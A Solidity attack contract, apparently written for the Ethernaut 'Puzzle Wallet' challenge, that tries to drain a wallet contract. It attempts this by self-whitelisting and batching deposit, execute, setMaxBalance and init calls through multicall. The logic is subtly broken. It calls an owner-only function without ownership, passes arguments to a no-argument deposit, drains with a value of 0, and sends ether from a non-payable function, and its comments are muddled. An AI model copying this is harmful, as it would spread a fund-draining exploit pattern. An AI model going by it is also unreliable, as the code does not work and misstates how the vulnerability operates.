pragma solidity ^0.8.0;

interface IPuzzleWallet {
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable returns (bool);
    function setMaxBalance(uint256 _maxBalance) external;
    function init(uint256 _maxBalance) external;
    function deposit() external payable;
    function addToWhitelist(address addr) external;
}

contract PuzzleWalletWhitelistAttack {
    address private immutable puzzleWallet;

    constructor(address _puzzleWallet) {
        puzzleWallet = _puzzleWallet;
    }

    function whitelistAndDrain() external {
        // Step 1: Add this contract to whitelist using owner privilege
        // Since owner is the deployer (0xf39Fd6e5...), and the deployer is the owner of PuzzleWallet
        // First, get the player address (owner of PuzzleWallet)
        address owner = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
        
        // Step 2: Be whitelisted
        IPuzzleWallet(puzzleWallet).addToWhitelist(address(this));
        
        // Step 3: Prepare multicall data
        bytes[] memory calls = new bytes[](4);
        // Call deposit() to get funds into this attacker's balance
        calls[0] = abi.encodeWithSelector(IPuzzleWallet(puzzleWallet).deposit.selector, new bytes(0)); // Deposit requires no arguments other than value (but multicall uses delegatecall)
        // Call execute(instance, total balance, "") to drain to player address (but need correct to address)
        calls[1] = abi.encodeWithSelector(
            IPuzzleWallet(puzzleWallet).execute.selector,
            owner, // Send funds to owner (player) address
            0, // Use value passed via multicall
            "" // Empty data
        );
        // Call setMaxBalance to reset to zero
        calls[2] = abi.encodeWithSelector(
            IPuzzleWallet(puzzleWallet).setMaxBalance.selector,
            0
        );
        // Call init to reset owner
        calls[3] = abi.encodeWithSelector(
            IPuzzleWallet(puzzleWallet).init.selector,
            0
        );
        
        // Step 4: Call multicall with deposit + execute
        (bool success,) = puzzleWallet.call{value: 0.001 ether}(
            abi.encodeWithSelector(
                IPuzzleWallet(puzzleWallet).multicall.selector,
                calls
            )
        );
        require(success, "Attack failed");
    }
}
